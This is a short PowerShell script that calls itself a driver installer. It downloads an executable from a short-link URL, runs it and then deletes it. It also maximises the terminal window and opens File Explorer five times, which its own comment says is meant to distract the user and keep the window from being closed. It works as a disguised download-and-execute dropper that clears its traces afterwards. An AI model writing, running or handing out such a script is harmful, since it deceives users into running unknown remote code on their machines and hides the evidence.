# Driver Installer Script
$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"

# --- Anti-Interruption & Full Screen Setup ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 3) # 3 = Maximize/Full Screen

Write-Host "Starting installation..." -ForegroundColor Cyan

# Open File Explorer 5 times to distract/prevent closing
1..5 | ForEach-Object { Start-Process explorer }

# Download the file
Write-Host "importing...." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

# Run the file
if (Test-Path $out) {
    Write-Host "Running..." -ForegroundColor Green
    Start-Process -FilePath $out -Wait
    Write-Host "complete!" -ForegroundColor Green

    # Remove the file after running
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup complete." -ForegroundColor Gray
} else {
    Write-Warning "swerteeng kumag"
}

# Exit the terminal
exit
